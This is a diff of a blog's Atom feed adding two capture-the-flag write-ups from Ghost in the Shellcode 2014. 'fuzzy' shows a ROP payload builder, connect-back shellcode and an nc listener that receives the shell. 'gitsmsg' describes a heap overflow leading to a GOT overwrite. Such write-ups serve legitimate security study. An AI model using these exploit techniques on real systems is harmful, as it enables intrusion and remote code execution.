@@ -1,5 +1,249 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-09-25T00:00:00-07:00</updated><entry><title>Reading resumes</title><link href="http://codearcana.com/posts/2013/09/25/reading-resumes.html" rel="alternate"></link><updated>2013-09-25T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-09-25:posts/2013/09/25/reading-resumes.html</id><summary type="html">&lt;p&gt;Tonight, I sat down and read through every resume in the 2013 SCS senior
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2014-01-19T00:00:00-08:00</updated><entry><title>Ghost in the Shellcode 2014 - fuzzy</title><link href="http://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html" rel="alternate"></link><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html</id><summary type="html">&lt;p&gt;tl;dr - &lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
+buckets past the end of the buffer if non ascii text is provided, allowing us to
+rop. Binary and exploit available &lt;a
+href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz"&gt;here&lt;/a&gt;.
+Cross post from &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146"&gt;PPP
+blog&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;The program&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc fuzzy.2014.ghostintheshellcode.com 4141
+&lt;span class="go"&gt;Welcome to the super secure parsing engine!&lt;/span&gt;
+&lt;span class="go"&gt;Please select a parser!&lt;/span&gt;
+
+&lt;span class="go"&gt;1) Sentence histogram&lt;/span&gt;
+&lt;span class="go"&gt;2) Sorted characters (ascending)&lt;/span&gt;
+&lt;span class="go"&gt;3) Sorted characters (decending)&lt;/span&gt;
+&lt;span class="go"&gt;4) Sorted ints (ascending)&lt;/span&gt;
+&lt;span class="go"&gt;5) Sorted ints (decending&lt;/span&gt;
+&lt;span class="go"&gt;6) global_find numbers in string&lt;/span&gt;
+&lt;span class="go"&gt;1&lt;/span&gt;
+&lt;span class="go"&gt;Enter a series of characters&lt;/span&gt;
+&lt;span class="go"&gt;hello&lt;/span&gt;
+&lt;span class="go"&gt; :0 !:0 &amp;quot;:0 #:0 $:0 &lt;/span&gt;
+&lt;span class="gp"&gt;%&lt;/span&gt;:0 &amp;amp;:0 &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;:0 &lt;span class="o"&gt;(&lt;/span&gt;:0 &lt;span class="o"&gt;)&lt;/span&gt;:0 
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;a:0 b:0 c:0 d:0 e:1 &lt;/span&gt;
+&lt;span class="go"&gt;f:0 g:0 h:1 i:0 j:0 &lt;/span&gt;
+&lt;span class="go"&gt;k:0 l:2 m:0 n:0 o:1 &lt;/span&gt;
+&lt;span class="go"&gt;p:0 q:0 r:0 s:0 t:0 &lt;/span&gt;
+&lt;span class="go"&gt;u:0 v:0 w:0 x:0 y:0 &lt;/span&gt;
+&lt;span class="go"&gt;z:0 {:0 |:0 }:0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As you can see, it computes a histogram of the input. This histogram
+is constructed using a buffer that is on the stack, so if we send it
+non-ascii text we can write to the stack. By modifying the saved &lt;code&gt;ebp&lt;/code&gt;,
+we can point the stack to a buffer we control. &lt;/p&gt;
+&lt;p&gt;Unfortunately, this is a bit challenging to figure out because all 
+the interesting functions are encrypted. Fortunately for us, the "encryption"
+is just bitwise not. Using our favorite hex editor, we make a new binary with 
+the decrypted functions to reverse.&lt;/p&gt;
+&lt;p&gt;With control of the stack, we get control over rip and can ROP.
+We will use the &lt;code&gt;callFunction&lt;/code&gt; function, which decrypts a function
+into an executable page and then runs it. Our goal will be to &lt;code&gt;read&lt;/code&gt; encrypted shellcode
+into a known location (there is a convenient buffer &lt;code&gt;dontcollide&lt;/code&gt; in the data
+section that is never used), then invoke &lt;code&gt;callFunction&lt;/code&gt; to run our shellcode. 
+Unfortunately, since this is x64, we need to find a good gadget to be able to
+control registers and call functions. Luckily, there is a good gadget in 
+&lt;code&gt;__libc_csu_init&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;loc_401790:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+64j&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r13&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r14&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;r15d&lt;/span&gt;
+                &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="kt"&gt;qword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+                &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;rbp&lt;/span&gt;
+                &lt;span class="nf"&gt;jnz&lt;/span&gt;     &lt;span class="nv"&gt;short&lt;/span&gt; &lt;span class="nv"&gt;loc_401790&lt;/span&gt;
+
+&lt;span class="nl"&gt;loc_4017A6:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+4Aj&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;10h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;18h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;20h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;28h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;30h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;38h&lt;/span&gt;
+                &lt;span class="nf"&gt;retn&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This gadget allows us to control the first three  registers we need an call 
+anything we have function pointer to. The program uses a large function pointer table to enable
+the encrypted functions to call library functions, so we have pointers to many
+library functions. Unfortunately, we do &lt;em&gt;not&lt;/em&gt; have a pointer to &lt;code&gt;readAll&lt;/code&gt;, so we
+cannot use it with our gadget. Furthermore, our gadget only controls 3 arguments,
+so we cannot easily use &lt;code&gt;recv&lt;/code&gt;. Lastly, we cannot use the encrypted &lt;code&gt;my_readAll&lt;/code&gt;
+function (that we have a pointer to) because it reads its arguments out of a
+buffer and we don't have an easy way to call functions with a buffer we control 
+as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
+with 3 arguments:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Assumes rip points to loc_4017A6.&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+  &lt;span class="c"&gt;# Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to&lt;/span&gt;
+  &lt;span class="c"&gt;# loc_4017A6 for repeated calls.&lt;/span&gt;
+  &lt;span class="c"&gt;#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__libc_csu_init_gadget&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Instead, we make a function pointer to &lt;code&gt;readAll&lt;/code&gt; in the data section that we can use our
+gadget.
+We call &lt;code&gt;memset&lt;/code&gt; 4 times, once for each distinct byte in
+the the address of &lt;code&gt;readAll&lt;/code&gt;, and make &lt;code&gt;dontcollide&lt;/code&gt; a pointer to &lt;code&gt;readAll&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Set dontcollide to be a function pointer to readAll (0x4013cb).&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then can use our gadget to call &lt;code&gt;readAll&lt;/code&gt;, 
+reading the encrypted shellcode into &lt;code&gt;dontcollide&lt;/code&gt;, and then again to call
+&lt;code&gt;callFunction&lt;/code&gt;, executing our shellcode. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Read the shellcode into a buffer. The socket to read from is 4.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x400&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c"&gt;# Call our shellcode.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callEncryptedFunction_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We grab some connect back shellcode 
+and get a shell:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="go"&gt;~% python fuzzy.py                                           [console 1]&lt;/span&gt;
+&lt;span class="go"&gt;~% nc -l 16705                                               [console 2]&lt;/span&gt;
+&lt;span class="go"&gt;cat key.txt&lt;/span&gt;
+&lt;span class="go"&gt;key is: fuzzingIsFun2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Ghost in the Shellcode 2014 - gitsmsg</title><link href="http://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html" rel="alternate"></link><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html</id><summary type="html">&lt;p&gt;&lt;em&gt;tl;dr&lt;/em&gt; - &lt;code&gt;gitsmsg&lt;/code&gt; is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
+after circumventing RELRO. Binary and exploit available &lt;a
+href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz"&gt;here&lt;/a&gt;. Cross post from 
+&lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;The program&lt;/h2&gt;
+&lt;p&gt;First, we reverse engineered much of the binary. 
+You "login" as a user, then can compose messages to other users. The messages
+were saved to a linked list and could be edited before being serialized to disk.
+Each message is a tagged union of &lt;code&gt;{byte,dword,double}{_,array}&lt;/code&gt;
+or &lt;code&gt;string&lt;/code&gt;. A &lt;code&gt;string&lt;/code&gt; indexed into an array of static strings.
+A "typical" usage might be:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# After connection, appropriate functions hide the binary protocol.&lt;/span&gt;
+&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;alex&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;newmessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;andrew&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DWORD_ARRAY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;newmassage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;max&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;STRING&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;edit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;disconnect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;The vulnerability&lt;/h2&gt;
+&lt;p&gt;In short, when initializing one of the message type, the programmer forgot to
+factor the data type width when calculating the message size:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;DOUBLE_ARRAY&lt;/span&gt;:
+  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x3FF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="n"&gt;v4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1023&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;v4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;LABEL_9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This eventually gives us a heap overwrite:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At this point, it seems relatively straightforward. We will allocate 2 messages,
+leaving the heap in this state:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;| message A | data A | message B |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then free the first message:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;| &amp;lt;free&amp;gt; | &amp;lt;free&amp;gt; | message B |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And allocate a new message of type &lt;code&gt;DOUBLE_ARRAY&lt;/code&gt;, allowing us to overwrite and
+modify the second message:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;| message C | data C ... essage B |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Our goal will be to overwrite a GOT entry and give us a shell. Since the program
+is PIE, we have to leak an address first. We do this by editing the second
+message which does 2 things for us: it allows us to put it back into a valid
+state, and it will put a address from the &lt;code&gt;.data&lt;/code&gt; segment into the heap (if a 
+&lt;code&gt;string&lt;/code&gt; message is edited, it will update the message data pointer to point
+to the correct string in the &lt;code&gt;.data&lt;/code&gt; segment). &lt;/p&gt;
+&lt;p&gt;Actually, at this point we have an arbitrary read and an arbitrary write
+primitive. Since the data for the first message overlaps with the type and 
+pointer of the second message, we can edit the first message to change the type
+of the second. If we change the type of the second message to &lt;code&gt;dword&lt;/code&gt; and its
+pointer to &lt;code&gt;&amp;lt;address&amp;gt;&lt;/code&gt;, we can get the contents of the second message to read 
+from that address and edit the contents of the second message to write to that
+address.&lt;/p&gt;
+&lt;p&gt;Once we have the program base, we use our arbitrary read primitive to leak a
+&lt;code&gt;libc&lt;/code&gt; address. We know it is an Ubuntu machine, so we download a couple versions
+of &lt;code&gt;libc&lt;/code&gt; and compare the address to the symbol in each of the versions to match
+the correct &lt;code&gt;libc&lt;/code&gt; version. We can now overwrite &lt;code&gt;free&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt; and delete
+our message to get a shell!&lt;/p&gt;
